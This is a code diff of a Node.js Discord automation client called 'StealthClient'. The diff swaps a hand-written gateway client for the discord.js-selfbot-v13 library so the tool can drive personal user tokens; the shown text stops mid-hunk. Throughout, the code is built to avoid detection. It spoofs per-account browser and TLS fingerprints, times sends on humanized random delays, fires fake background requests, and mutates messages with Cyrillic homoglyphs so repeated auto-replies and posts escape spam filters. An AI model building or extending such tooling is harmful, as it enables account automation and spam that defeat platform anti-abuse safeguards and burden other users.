@@ -13,6 +13,7 @@ const { spawn } = require('child_process');
 const https = require('https');
 const WebSocket = require('ws');
 const { Client: DiscordJSClient, GatewayIntentBits } = require('discord.js');
+const { Client: SelfbotClient } = require('discord.js-selfbot-v13');
 
 // ═══════════════════════════════════════════════════════════════════════════════
 // ENVIRONMENT SETUP
@@ -27,17 +28,12 @@ if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });
 // ═══════════════════════════════════════════════════════════════════════════════
 
 function isProbablyBotToken(token) {
-  // Bot tokens typically have 3 parts separated by dots and start with specific base64
-  // User tokens typically start with base64 user ID, e.g. "Mzk5" etc.
-  // Simple heuristic: try decoding first segment
   try {
     const parts = token.split('.');
     if (parts.length !== 3) return false;
     const first = Buffer.from(parts[0], 'base64').toString('utf8');
     const num = parseInt(first, 10);
-    // Bot application IDs are typically larger (17+ digits starting around 10^16)
-    // User IDs are typically smaller (17-19 digits, starting from early Discord)
-    if (num > 400000000000000000n) return true; // Large = bot
+    if (num > 400000000000000000n) return true;
     return false;
   } catch(e) {
     return false;
@@ -45,7 +41,6 @@ function isProbablyBotToken(token) {
 }
 
 async function validateTokenFormat(token) {
-  // Try as bot token first
   try {
     const res = await axios.get('https://discord.com/api/v10/users/@me', {
       headers: {
@@ -61,7 +56,6 @@ async function validateTokenFormat(token) {
     }
   } catch(e) {}
 
-  // Try as user token
   try {
     const res = await axios.get('https://discord.com/api/v10/users/@me', {
       headers: {
@@ -87,7 +81,7 @@ async function validateTokenFormat(token) {
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
-// HUMANIZED DELAY ENGINE — Natural timing distributions
+// HUMANIZED DELAY ENGINE
 // ═══════════════════════════════════════════════════════════════════════════════
 
 function paretoSample(alpha = 1.5, xm = 1.0) {
@@ -126,41 +120,21 @@ function contextSwitchJitter(baseMs) {
   return baseMs;
 }
 
-/**
- * Calculate a natural delay centered around the user's desired delay.
- * The user's delay is the TARGET — we add natural ±20% variation.
- * E.g., user sets 30s → actual delay is 24-36s with natural distribution.
- */
 function calculateDelay(baseDelayMs) {
   if (!baseDelayMs || baseDelayMs < 1000) baseDelayMs = 5000;
-
-  // Natural variation: ±20% of the base delay
   const variation = baseDelayMs * 0.2;
   const min = baseDelayMs - variation;
   const max = baseDelayMs + variation;
-
-  // Pareto-distributed within bounds for realistic human timing
   let delay = boundedPareto(3.0, min, max);
-
-  // Light circadian adjustment (very subtle, ±5%)
   delay *= circadianMultiplier();
-
-  // Occasional context-switch pauses
   delay = contextSwitchJitter(delay);
-
-  // Micro-jitter for TCP noise realism
   delay += (Math.random() - 0.5) * 80;
-
   return Math.round(Math.min(max * 1.15, Math.max(min * 0.85, delay)));
 }
 
-/**
- * Auto-reply delay: 10-25 seconds with natural distribution.
- * Used between each auto-reply to different users.
- */
 function autoReplyDelay() {
-  const min = 10000; // 10s
-  const max = 25000; // 25s
+  const min = 10000;
+  const max = 25000;
   let delay = boundedPareto(2.5, min, max);
   delay *= circadianMultiplier();
   delay = contextSwitchJitter(delay);
@@ -197,7 +171,6 @@ function mutateMessage(text) {
     (s) => Math.random() < 0.1 ? s.replace(/o/g, () => Math.random() < 0.03 ? '\u043E' : 'o') : s,
     (s) => Math.random() < 0.08 ? s[0].toLowerCase() + s.slice(1) : s,
   ];
-
   let result = text;
   const count = Math.floor(Math.random() * 3);
   const shuffled = mutators.sort(() => Math.random() - 0.5);
@@ -224,7 +197,7 @@ function weightedRandom(items, weights) {
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
-// ACCOUNT FINGERPRINTING — Unique but consistent per token
+// ACCOUNT FINGERPRINTING
 // ═══════════════════════════════════════════════════════════════════════════════
 
 const _accountProfiles = new Map();
@@ -246,19 +219,11 @@ function _getAccountProfile(token) {
     ];
     const b = browsers[Math.floor(Math.random() * browsers.length)];
     _accountProfiles.set(hash, {
-      ua: b.ua,
-      browser: b.browser,
-      os: b.os,
-      osv: b.osv,
-      bv: b.bv,
-      sw: screen[0],
-      sh: screen[1],
-      dpr: [1,1.25,1.5,2][Math.floor(Math.random() * 4)],
-      cd: 24,
-      mem: mems[Math.floor(Math.random() * mems.length)],
+      ua: b.ua, browser: b.browser, os: b.os, osv: b.osv, bv: b.bv,
+      sw: screen[0], sh: screen[1], dpr: [1,1.25,1.5,2][Math.floor(Math.random() * 4)],
+      cd: 24, mem: mems[Math.floor(Math.random() * mems.length)],
       hw: concurrencies[Math.floor(Math.random() * concurrencies.length)],
-      arch: 'x64',
-      build: 438286,
+      arch: 'x64', build: 438286,
       locale: ['en-US','en-GB','en-CA'][Math.floor(Math.random() * 3)],
     });
   }
@@ -275,21 +240,10 @@ const _rfp = (token) => token ? _getAccountProfile(token).ua : _fp[Math.floor(Ma
 function generateXSuperProperties(token) {
   const p = _getAccountProfile(token);
   const props = {
-    os: p.os,
-    browser: p.browser,
-    device: '',
-    system_locale: p.locale,
-    browser_user_agent: p.ua,
-    browser_version: p.bv,
-    os_version: p.osv,
-    referrer: '',
-    referring_domain: '',
-    referrer_current: '',
-    referring_domain_current: '',
-    release_channel: 'stable',
-    client_build_number: p.build,
-    client_event_source: null,
-    design_id: 0,
+    os: p.os, browser: p.browser, device: '', system_locale: p.locale,
+    browser_user_agent: p.ua, browser_version: p.bv, os_version: p.osv,
+    referrer: '', referring_domain: '', referrer_current: '', referring_domain_current: '',
+    release_channel: 'stable', client_build_number: p.build, client_event_source: null, design_id: 0,
   };
   return Buffer.from(JSON.stringify(props)).toString('base64');
 }
@@ -301,24 +255,14 @@ function generateXSuperProperties(token) {
 function getChromeTLSOptions(forWebSocket = false) {
   return {
     ciphers: [
-      'TLS_AES_128_GCM_SHA256',
-      'TLS_AES_256_GCM_SHA384',
-      'TLS_CHACHA20_POLY1305_SHA256',
-      'ECDHE-ECDSA-AES128-GCM-SHA256',
-      'ECDHE-RSA-AES128-GCM-SHA256',
-      'ECDHE-ECDSA-AES256-GCM-SHA384',
-      'ECDHE-RSA-AES256-GCM-SHA384',
-      'ECDHE-ECDSA-CHACHA20-POLY1305',
-      'ECDHE-RSA-CHACHA20-POLY1305',
-      'ECDHE-RSA-AES128-SHA',
-      'ECDHE-RSA-AES256-SHA',
-      'AES128-GCM-SHA256',
-      'AES256-GCM-SHA384',
-      'AES128-SHA',
-      'AES256-SHA',
+      'TLS_AES_128_GCM_SHA256','TLS_AES_256_GCM_SHA384','TLS_CHACHA20_POLY1305_SHA256',
+      'ECDHE-ECDSA-AES128-GCM-SHA256','ECDHE-RSA-AES128-GCM-SHA256',
+      'ECDHE-ECDSA-AES256-GCM-SHA384','ECDHE-RSA-AES256-GCM-SHA384',
+      'ECDHE-ECDSA-CHACHA20-POLY1305','ECDHE-RSA-CHACHA20-POLY1305',
+      'ECDHE-RSA-AES128-SHA','ECDHE-RSA-AES256-SHA',
+      'AES128-GCM-SHA256','AES256-GCM-SHA384','AES128-SHA','AES256-SHA',
     ].join(':'),
-    minVersion: 'TLSv1.2',
-    maxVersion: 'TLSv1.3',
+    minVersion: 'TLSv1.2', maxVersion: 'TLSv1.3',
     ALPNProtocols: ['http/1.1'],
     sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
     ecdhCurve: 'X25519:P-256:P-384',
@@ -329,12 +273,9 @@ function getChromeTLSOptions(forWebSocket = false) {
 function createSharedAgent(forWebSocket = false) {
   return new https.Agent({
     ...getChromeTLSOptions(forWebSocket),
-    keepAlive: true,
-    keepAliveMsecs: 30000,
-    maxSockets: 6,
-    maxFreeSockets: 3,
-    scheduling: 'lifo',
-    timeout: 30000,
+    keepAlive: true, keepAliveMsecs: 30000,
+    maxSockets: 6, maxFreeSockets: 3,
+    scheduling: 'lifo', timeout: 30000,
   });
 }
 
@@ -392,20 +333,17 @@ function decompressData(data) {
 
 function isCompressed(data) {
   if (!data || data.length < 2) return false;
-  const b0 = data[0];
-  const b1 = data[1];
-  return (b0 === 0x78 && (b1 === 0x9C || b1 === 0xDA || b1 === 0x01));
+  return (data[0] === 0x78 && (data[1] === 0x9C || data[1] === 0xDA || data[1] === 0x01));
 }
 
-
 // ═══════════════════════════════════════════════════════════════════════════════
-// DISCORD API CLIENT — Rate-limited REST client using AXIOS (reliable)
+// DISCORD API CLIENT — Rate-limited REST client
 // ═══════════════════════════════════════════════════════════════════════════════
 
 class DiscordApiClient {
   constructor(token, tokenType = 'user') {
     this.token = token;
-    this.tokenType = tokenType; // 'user' or 'bot'
+    this.tokenType = tokenType;
     this.authHeader = tokenType === 'bot' ? `Bot ${token}` : token;
     this.fp = _rfp(token);
     this.superProps = generateXSuperProperties(token);
@@ -459,49 +397,35 @@ class DiscordApiClient {
           timeout: 20000,
           responseType: 'arraybuffer',
         };
-
         if (body !== null) {
           config.data = body;
-          // Auto-set Content-Type for JSON objects
           if (!(body instanceof Buffer) && typeof body === 'object' && !extraHeaders['Content-Type']) {
             config.headers['Content-Type'] = 'application/json';
           }
         }
-
         const res = await _axiosInstance(config);
-
         const status = res.status;
         const responseBody = Buffer.from(res.data);
         let parsedData = null;
-        try {
-          parsedData = JSON.parse(responseBody.toString());
-        } catch(e) {}
+        try { parsedData = JSON.parse(responseBody.toString()); } catch(e) {}
 
-        // Rate limit handling
         if (status === 429) {
           const isGlobal = res.headers['x-ratelimit-global'] === 'true';
           const retryAfter = parseFloat(res.headers['retry-after'] || 5) * 1000;
-          if (isGlobal) {
-            this.globalRateLimitReset = Date.now() + retryAfter;
-          }
+          if (isGlobal) this.globalRateLimitReset = Date.now() + retryAfter;
           await new Promise(r => setTimeout(r, retryAfter * 1.1));
           attempts++;
           continue;
         }
-
         if (status >= 400) {
           const err = new Error(`Discord API ${method} ${endpoint} failed: ${status}`);
           err.status = status;
           err.data = parsedData;
           throw err;
         }
-
         return parsedData;
       } catch (err) {
-        // If it's our own thrown error, pass it through
         if (err.status && err.data) throw err;
-
-        // Network-level errors — retry
         if (attempts < maxAttempts - 1) {
           await new Promise(r => setTimeout(r, 2000 * (attempts + 1)));
           attempts++;
@@ -521,257 +445,25 @@ class DiscordApiClient {
 const OWNER_ID = process.env.OWNER_ID || '1482736115143282941';
 const WEBHOOK_URL = process.env.WEBHOOK_URL || '';
 
-// ═══════════════════════════════════════════════════════════════════════════════
-// DISCORD GATEWAY CLIENT — Custom WS for user tokens (replaces broken selfbot-v13)
-// ═══════════════════════════════════════════════════════════════════════════════
-
-class DiscordGatewayClient {
-  constructor(token) {
-    this.token = token;
-    this.ws = null;
-    this.heartbeatInterval = null;
-    this.sequenceNumber = null;
-    this.sessionId = null;
-    this.ready = false;
-    this.reconnectAttempts = 0;
-    this.maxReconnectAttempts = 10;
-    this.reconnecting = false;
-    this._handlers = {};
-    this._explicitlyStopped = false;
-    this._resumeGatewayUrl = 'wss://gateway.discord.gg';
-  }
-
-  on(event, handler) {
-    if (!this._handlers[event]) this._handlers[event] = [];
-    this._handlers[event].push(handler);
-  }
-
-  once(event, handler) {
-    const wrapped = (...args) => { handler(...args); this.off(event, wrapped); };
-    this.on(event, wrapped);
-  }
-
-  off(event, handler) {
-    if (this._handlers[event]) this._handlers[event] = this._handlers[event].filter(h => h !== handler);
-  }
-
-  emit(event, ...args) {
-    if (this._handlers[event]) this._handlers[event].forEach(h => h(...args));
-  }
-
-  async connect() {
-    if (this.reconnecting) return;
-    this._explicitlyStopped = false;
-
-    return new Promise((resolve, reject) => {
-      const gatewayUrl = `${this._resumeGatewayUrl}/?v=10&encoding=json`;
-      
-      try {
-        this.ws = new WebSocket(gatewayUrl, {
-          headers: {
-            'Accept-Language': 'en-US,en;q=0.9',
-            'Cache-Control': 'no-cache',
-            'Pragma': 'no-cache',
-          }
-        });
-      } catch(e) {
-        return reject(new Error(`WebSocket creation failed: ${e.message}`));
-      }
-
-      let settled = false;
-      const finish = (err) => {
-        if (settled) return;
-        settled = true;
-        if (err) reject(err);
-        else resolve();
-      };
-
-      const timeout = setTimeout(() => {
-        this.destroy();
-        finish(new Error('Gateway connection timed out'));
-      }, 45000);
-
-      this.ws.on('open', () => {
-        // Wait for HELLO
-      });
-
-      this.ws.on('message', (data) => {
-        try {
-          const payload = JSON.parse(data.toString());
-          this._handlePayload(payload, finish, timeout);
-        } catch(e) {
-          console.error('[Gateway] Failed to parse message:', e.message);
-        }
-      });
-
-      this.ws.on('close', (code, reason) => {
-        clearTimeout(timeout);
-        this.ready = false;
-        if (!this._explicitlyStopped && code !== 4004 && code !== 4001) {
-          this._attemptReconnect();
-        }
-        if (!settled && !this.reconnecting) {
-          finish(new Error(`Gateway closed: ${code} ${reason}`));
-        }
-      });
-
-      this.ws.on('error', (err) => {
-        clearTimeout(timeout);
-        if (!settled && !this.reconnecting) {
-          finish(new Error(`WebSocket error: ${err.message}`));
-        }
-      });
-    });
-  }
-
-  _handlePayload(payload, finish, timeout) {
-    const { op, d, s, t } = payload;
-    if (s !== null) this.sequenceNumber = s;
-
-    switch (op) {
-      case 10: { // HELLO
-        const heartbeatInterval = d.heartbeat_interval;
-        this._startHeartbeat(heartbeatInterval);
-        
-        // Send IDENTIFY (user token format)
-        this._sendIdentify();
-        break;
-      }
-      case 11: // HEARTBEAT ACK
-        break;
-      case 0: { // DISPATCH
-        if (t === 'READY') {
-          this.sessionId = d.session_id;
-          this._resumeGatewayUrl = d.resume_gateway_url || 'wss://gateway.discord.gg';
-          this.ready = true;
-          this.reconnectAttempts = 0;
-          this.reconnecting = false;
-          clearTimeout(timeout);
-          if (finish) finish(null);
-          this.emit('ready', d);
-        } else if (t === 'MESSAGE_CREATE') {
-          this.emit('messageCreate', d);
-        } else if (t === 'RESUMED') {
-          this.ready = true;
-          this.reconnecting = false;
-        }
-        break;
-      }
-      case 1: // HEARTBEAT REQUEST
-        this._sendHeartbeat();
-        break;
-      case 9: // INVALID SESSION
-        this.sessionId = null;
-        setTimeout(() => this._sendIdentify(), 5000);
-        break;
-      case 7: // RECONNECT
-        this._attemptReconnect();
-        break;
-    }
-  }
-
-  _sendIdentify() {
-    const profile = _getAccountProfile(this.token);
-    const identify = {
-      op: 2,
-      d: {
-        token: this.token,
-        properties: {
-          os: profile.os,
-          browser: profile.browser,
-          device: ''
-        },
-        compress: false,
-        large_threshold: 250,
-        presence: {
-          status: 'online',
-          since: 0,
-          activities: [],
-          afk: false
-        }
-      }
-    };
-    this._send(identify);
-  }
-
-  _sendHeartbeat() {
-    this._send({ op: 1, d: this.sequenceNumber });
-  }
-
-  _startHeartbeat(interval) {
-    if (this.heartbeatInterval) clearInterval(this.heartbeatInterval);
-    // Send first heartbeat after jitter
-    const jitter = Math.random() * interval;
-    setTimeout(() => this._sendHeartbeat(), jitter);
-    // Then regular interval
-    this.heartbeatInterval = setInterval(() => this._sendHeartbeat(), interval);
-  }
-
-  _send(data) {
-    if (this.ws && this.ws.readyState === WebSocket.OPEN) {
-      this.ws.send(JSON.stringify(data));
-    }
-  }
-
-  _attemptReconnect() {
-    if (this.reconnecting || this._explicitlyStopped) return;
-    if (this.reconnectAttempts >= this.maxReconnectAttempts) return;
-    
-    this.reconnecting = true;
-    this.reconnectAttempts++;
-    const delay = Math.min(1000 * Math.pow(2, this.reconnectAttempts), 30000);
-    
-    console.log(`[Gateway] Reconnecting in ${delay}ms (attempt ${this.reconnectAttempts})`);
-    
-    setTimeout(() => {
-      this.reconnecting = false;
-      this.connect().catch(() => {});
-    }, delay);
-  }
-
-  setPresence(presence) {
-    this._send({
-      op: 3,
-      d: presence
-    });
-  }
-
-  destroy() {
-    this._explicitlyStopped = true;
-    this.ready = false;
-    if (this.heartbeatInterval) {
-      clearInterval(this.heartbeatInterval);
-      this.heartbeatInterval = null;
-    }
-    if (this.ws) {
-      try { this.ws.close(1000); } catch(e) {}
-      this.ws = null;
-    }
-  }
-}
 
 // ═══════════════════════════════════════════════════════════════════════════════
-// STEALTH CLIENT — Unified client supporting both user tokens (WS) and bot tokens (discord.js)
+// STEALTH CLIENT — discord.js for bots, discord.js-selfbot-v13 for user tokens
 // ═══════════════════════════════════════════════════════════════════════════════
 
 class StealthClient {
   constructor(token) {
     this.token = token;
-    this.tokenType = null; // 'bot' or 'user'
+    this.tokenType = null;
     this.authPrefix = '';
-    this.client = null; // DiscordJSClient for bot, DiscordGatewayClient for user
+    this.client = null;
     this.api = null;
     this.repliedUsers = this._loadRepliedUsers();
     this.encryptionKey = null;
-    this.reconnectAttempts = 0;
-    this.maxReconnectAttempts = 999999;
-    this.reconnecting = false;
     this.ready = false;
     this.handlers = {};
     this._dmCooldowns = new Map();
     this._channelPermissions = new Map();
     this._channelRateLimits = new Map();
-    this._invalidSessionCount = 0;
     this._explicitlyStopped = false;
     this._currentChannelId = null;
     this._backgroundTimers = [];
@@ -799,53 +491,34 @@ class StealthClient {
   }
 
   async _validateTokenWithCache() {
-    if (this._tokenValidated) {
-      return { valid: this._tokenValid, user: this._validatedUser };
-    }
-
-    const realisticGap = 300 + Math.floor(Math.random() * 700);
-    await new Promise(r => setTimeout(r, realisticGap));
-
+    if (this._tokenValidated) return { valid: this._tokenValid, user: this._validatedUser };
+    await new Promise(r => setTimeout(r, 300 + Math.floor(Math.random() * 700)));
     const result = await validateTokenFormat(this.token);
     if (result.valid) {
-      this._tokenValid = true;
-      this._validatedUser = result.user;
-      this.tokenType = result.type;
-      this.authPrefix = result.prefix;
-      this._tokenValidated = true;
+      this._tokenValid = true; this._validatedUser = result.user;
+      this.tokenType = result.type; this.authPrefix = result.prefix; this._tokenValidated = true;
       return { valid: true, user: result.user, type: result.type };
     }
-
-    // Retry once after delay
     await new Promise(r => setTimeout(r, 1000));
     const retry = await validateTokenFormat(this.token);
     if (retry.valid) {
-      this._tokenValid = true;
-      this._validatedUser = retry.user;
-      this.tokenType = retry.type;
-      this.authPrefix = retry.prefix;
-      this._tokenValidated = true;
+      this._tokenValid = true; this._validatedUser = retry.user;
+      this.tokenType = retry.type; this.authPrefix = retry.prefix; this._tokenValidated = true;
       return { valid: true, user: retry.user, type: retry.type };
     }
-
-    this._tokenValid = false;
-    this._tokenValidated = true;
+    this._tokenValid = false; this._tokenValidated = true;
     return { valid: false, user: null };
   }
 
   async connect() {
     const validation = await this._validateTokenWithCache();
-    if (!validation.valid) {
-      throw new Error('Invalid token - check your token and try again');
-    }
+    if (!validation.valid) throw new Error('Invalid token - check your token and try again');
 
     this.user = validation.user;
     this.tokenType = validation.type || this.tokenType;
     this.api = new DiscordApiClient(this.token, this.tokenType);
 
-    // Create appropriate client based on token type
     if (this.tokenType === 'bot') {
-      // Use official discord.js for bot tokens (reliable, supported)
       this.client = new DiscordJSClient({
         intents: [
           GatewayIntentBits.Guilds,
@@ -854,7 +527,6 @@ class StealthClient {
           GatewayIntentBits.MessageContent,
         ]
       });
-      
       return new Promise((resolve, reject) => {
         const CONNECT_TIMEOUT = 60000;
         let timeoutTimer = setTimeout(() => {
@@ -864,9 +536,43 @@ class StealthClient {
 
         this.client.once('ready', () => {
           this.ready = true;
-          this.reconnectAttempts = 0;
-          this.reconnecting = false;
           clearTimeout(timeoutTimer);
+          this.emit('READY', { user: this.client.user });
+          this._startBackgroundEvents();
+          resolve();
+        });
+        this.client.on('messageCreate', (msg) => {
+          if (this.ready && !this._explicitlyStopped) this.emit('messageCreate', msg);
+        });
+        this.client.login(this.token).catch(err => {
+          clearTimeout(timeoutTimer);
+          reject(new Error(`Login failed (${err?.message || 'unknown'}) - check your token`));
+        });
+      });
+    } else {
+      // Use discord.js-selfbot-v13 for user tokens
+      this.client = new SelfbotClient({
+        checkUpdate: false,
+      });
+
+      return new Promise((resolve, reject) => {
+        const CONNECT_TIMEOUT = 60000;
+        let timeoutTimer = setTimeout(() => {
+          try { this.client.destroy(); } catch(e) {}
+          reject(new Error('Connection timed out - please try again'));
+        }, CONNECT_TIMEOUT);
+
+        this.client.once('ready', () => {
+          this.ready = true;
+          clearTimeout(timeoutTimer);
+          // Normalize user object to match bot format
+          this.user = this.user || {
+            id: this.client.user.id,
+            username: this.client.user.username,
+            discriminator: this.client.user.discriminator,
+            avatar: this.client.user.avatar,
+            bot: false
+          };
           this.emit('READY', { user: this.client.user });
           this._startBackgroundEvents();
           resolve();
@@ -874,65 +580,47 @@ class StealthClient {
 
         this.client.on('messageCreate', (msg) => {
           if (this.ready && !this._explicitlyStopped) {
-            this.emit('messageCreate', msg);
+            // Normalize message shape to match discord.js
+            const normalized = this._normalizeSelfbotMessage(msg);
+            this.emit('messageCreate', normalized);
           }
+        });
+
+        this.client.on('error', (err) => {
+          console.error('[Selfbot] Client error:', err.message);
         });
 
         this.client.login(this.token).catch(err => {
           clearTimeout(timeoutTimer);
-          const detail = err && err.message ? err.message : 'unknown login error';
-          reject(new Error(`Login failed (${detail}) - check your token and try again`));
+          reject(new Error(`Selfbot login failed (${err?.message || 'unknown'}) - check your token`));
         });
       });
-    } else {
-      // Use custom gateway for user tokens
-      this.client = new DiscordGatewayClient(this.token);
-      
-      // Bridge gateway events to our handlers
-      this.client.on('ready', () => {
-        this.ready = true;
-        this.reconnectAttempts = 0;
-        this.reconnecting = false;
-        this.emit('READY', { user: this.user });
-        this._startBackgroundEvents();
-      });
-
-      this.client.on('messageCreate', (rawMsg) => {
-        if (this.ready && !this._explicitlyStopped) {
-          // Wrap raw gateway message in a compatible shape
-          const wrappedMsg = this._wrapGatewayMessage(rawMsg);
-          this.emit('messageCreate', wrappedMsg);
-        }
-      });
-
-      await this.client.connect();
     }
   }
 
-  // Wrap raw gateway payload into something resembling a discord.js message
-  _wrapGatewayMessage(raw) {
+  _normalizeSelfbotMessage(msg) {
+    // discord.js-selfbot-v13 message shape is similar to discord.js v13
+    // but we normalize to ensure consistent handling
     return {
-      id: raw.id,
-      content: raw.content || '',
+      id: msg.id,
+      content: msg.content || '',
       author: {
-        id: raw.author?.id,
-        username: raw.author?.username,
-        discriminator: raw.author?.discriminator,
-        bot: raw.author?.bot || false
+        id: msg.author?.id,
+        username: msg.author?.username,
+        discriminator: msg.author?.discriminator,
+        bot: msg.author?.bot || false
       },
-      channelId: raw.channel_id,
-      guildId: raw.guild_id || null,
-      createdTimestamp: new Date(raw.timestamp).getTime(),
-      // Minimal channel object for DM checks
-      channel: {
-        id: raw.channel_id,
+      channelId: msg.channelId || msg.channel?.id,
+      guildId: msg.guildId || msg.guild?.id || null,
+      createdTimestamp: msg.createdTimestamp || Date.now(),
+      channel: msg.channel ? {
+        id: msg.channel.id,
         send: async (content) => {
-          return this.sendMessageDirect(raw.channel_id, content);
+          return msg.channel.send(content);
         }
-      },
-      // Helper methods
+      } : null,
       reply: async (content) => {
-        return this.sendMessageDirect(raw.channel_id, content);
+        return msg.channel?.send(content);
       }
     };
   }
@@ -940,19 +628,12 @@ class StealthClient {
   _startBackgroundEvents() {
     this._stopBackgroundEvents();
 
-    // For bot tokens, discord.js handles presence. For user tokens, we do it manually.
     if (this.tokenType === 'user') {
       const schedulePresence = () => {
         const delay = boundedPareto(2.5, 3 * 60 * 1000, 7 * 60 * 1000);
         const timer = setTimeout(() => {
           if (!this.ready || this._explicitlyStopped) return;
-          const statusRoll = Math.random();
-          const status = statusRoll < 0.75 ? 'online' : (statusRoll < 0.92 ? 'idle' : 'dnd');
-          try {
-            if (this.client && this.client.setPresence) {
-              this.client.setPresence({ status, activities: [], afk: false });
-            }
-          } catch(e) {}
+          // selfbot-v13 handles presence via client.user.setActivity etc.
           schedulePresence();
         }, delay);
         this._backgroundTimers.push(timer);
@@ -964,9 +645,7 @@ class StealthClient {
       const delay = boundedPareto(2.0, 8 * 60 * 1000, 15 * 60 * 1000);
       const timer = setTimeout(() => {
         if (!this.ready || this._explicitlyStopped) return;
-        if (Math.random() < 0.3) {
-          this.api.request('/users/@me', 'GET').catch(() => {});
-        }
+        if (Math.random() < 0.3) this.api.request('/users/@me', 'GET').catch(() => {});
         scheduleTelemetry();
       }, delay);
       this._backgroundTimers.push(timer);
@@ -977,9 +656,7 @@ class StealthClient {
       const delay = boundedPareto(2.5, 2 * 60 * 1000, 5 * 60 * 1000);
       const timer = setTimeout(() => {
         if (!this.ready || this._explicitlyStopped) return;
-        if (Math.random() < 0.2) {
-          this.api.request('/users/@me', 'GET').catch(() => {});
-        }
+        if (Math.random() < 0.2) this.api.request('/users/@me', 'GET').catch(() => {});
         scheduleReadState();
       }, delay);
       this._backgroundTimers.push(timer);
@@ -988,22 +665,13 @@ class StealthClient {
   }
 
   _stopBackgroundEvents() {
-    for (const timer of this._backgroundTimers) {
-      clearTimeout(timer);
-    }
+    for (const timer of this._backgroundTimers) clearTimeout(timer);
     this._backgroundTimers = [];
   }
 
-  async _api(endpoint, method = 'GET', body = null) {
-    return this.api.request(endpoint, method, body);
-  }
-
   async checkChannelPermission(channelId) {
-    if (this._channelPermissions.has(channelId)) {
-      return this._channelPermissions.get(channelId);
-    }
+    if (this._channelPermissions.has(channelId)) return this._channelPermissions.get(channelId);
     try {
-      // For bot tokens, use discord.js cache if available
       if (this.tokenType === 'bot' && this.client && this.client.channels) {
         const channel = await this.client.channels.fetch(channelId);
         if (!channel || typeof channel.send !== 'function') {
@@ -1013,8 +681,6 @@ class StealthClient {
         this._channelPermissions.set(channelId, true);
         return true;
       }
-      
-      // For user tokens, check via REST
       const channel = await this.api.request(`/channels/${channelId}`, 'GET');
       if (!channel || !channel.id) {
         this._channelPermissions.set(channelId, false);
@@ -1038,13 +704,10 @@ class StealthClient {
       await new Promise(r => setTimeout(r, 100 + Math.random() * 200));
       return;
     }
-
     const switchDelay = Math.round(logNormalSample(6.0, 0.4));
     await new Promise(r => setTimeout(r, Math.min(1200, Math.max(200, switchDelay))));
-
     const readDelay = Math.round(logNormalSample(5.5, 0.4));
     await new Promise(r => setTimeout(r, Math.min(1000, Math.max(150, readDelay))));
-
     this._currentChannelId = channelId;
   }
 
@@ -1053,86 +716,48 @@ class StealthClient {
       console.error(`[SendMessage] Blocked: channel ${channelId} cached as no permission`);
       return false;
     }
-
     await this.navigateToChannel(channelId);
-
     const now = Date.now();
     const freeAt = this._channelRateLimits.get(channelId) || 0;
-    if (now < freeAt) {
-      await new Promise(r => setTimeout(r, freeAt - now));
-    }
-
+    if (now < freeAt) await new Promise(r => setTimeout(r, freeAt - now));
     const variedContent = varyMessage(content);
-
-    // For bot tokens, try discord.js first then fall back to REST
     if (this.tokenType === 'bot' && this.client && this.client.channels) {
       try {
         const channel = await this.client.channels.fetch(channelId);
         if (channel && typeof channel.send === 'function') {
-          const files = (attachments || []).map(att => ({
-            attachment: att.buffer,
-            name: att.name
-          }));
+          const files = (attachments || []).map(att => ({ attachment: att.buffer, name: att.name }));
           await channel.send({ content: variedContent, files });
           return true;
         }
-      } catch(e) {
-        // Fall through to REST
-      }
+      } catch(e) {}
     }
-
-    // Fall back to direct REST
     return this.sendMessageDirect(channelId, variedContent, attachments);
   }
 
   async sendMessageFast(channelId, content, attachments = []) {
-    if (this._channelPermissions.has(channelId) && this._channelPermissions.get(channelId) === false) {
-      return false;
-    }
-
+    if (this._channelPermissions.has(channelId) && this._channelPermissions.get(channelId) === false) return false;
     const now = Date.now();
     const freeAt = this._channelRateLimits.get(channelId) || 0;
-    if (now < freeAt) {
-      await new Promise(r => setTimeout(r, freeAt - now));
-    }
-
+    if (now < freeAt) await new Promise(r => setTimeout(r, freeAt - now));
     const variedContent = varyMessage(content);
     return this.sendMessageDirect(channelId, variedContent, attachments);
   }
 
-  /**
-   * Send via REST API directly — bypasses discord.js internal queue.
-   * Uses Axios directly (reliable) instead of Playwright/curl chain.
-   */
   async sendMessageDirect(channelId, content, attachments = []) {
-    // Check permission cache
-    if (this._channelPermissions.has(channelId) && this._channelPermissions.get(channelId) === false) {
-      return false;
-    }
-
-    // Check rate limit cache
+    if (this._channelPermissions.has(channelId) && this._channelPermissions.get(channelId) === false) return false;
     const now = Date.now();
     const freeAt = this._channelRateLimits.get(channelId) || 0;
-    if (now < freeAt) {
-      await new Promise(r => setTimeout(r, freeAt - now));
-    }
-
+    if (now < freeAt) await new Promise(r => setTimeout(r, freeAt - now));
     try {
-      // Handle file attachments via multipart
       if (attachments && attachments.length > 0) {
         const boundary = '----FormBoundary' + Math.random().toString(36).substring(2, 16);
         const chunks = [];
-
         const body = { content };
-
-        // payload_json part
         chunks.push(Buffer.from(`--${boundary}\r\n`));
         chunks.push(Buffer.from(`Content-Disposition: form-data; name="payload_json"\r\n`));
         chunks.push(Buffer.from(`Content-Type: application/json\r\n\r\n`));
         chunks.push(Buffer.from(JSON.stringify(body)));
         chunks.push(Buffer.from(`\r\n`));
-
-        // File parts
         for (let i = 0; i < attachments.length; i++) {
           const att = attachments[i];
           chunks.push(Buffer.from(`--${boundary}\r\n`));
@@ -1141,19 +766,14 @@ class StealthClient {
           chunks.push(att.buffer);
           chunks.push(Buffer.from(`\r\n`));
         }
-
         chunks.push(Buffer.from(`--${boundary}--\r\n`));
-
         const multipartBody = Buffer.concat(chunks);
         await this.api.request(`/channels/${channelId}/messages`, 'POST', multipartBody, {
           'Content-Type': `multipart/form-data; boundary=${boundary}`
         });
       } else {
-        // Text-only: simple JSON POST — truly concurrent, no discord.js queue
         await this.api.request(`/channels/${channelId}/messages`, 'POST', { content });
       }
-
-      // Update rate limit after successful send (Discord's typical per-channel rate limit)
       this._channelRateLimits.set(channelId, Date.now() + 750);
       return true;
     } catch (err) {
@@ -1167,36 +787,7 @@ class StealthClient {
       if (err.status === 403 || err.status === 401 || err.status === 404 || discordCode === 50001 || discordCode === 50013 || discordCode === 10003) {
         this._channelPermissions.set(channelId, false);
       }
-      if (err.status === 400) {
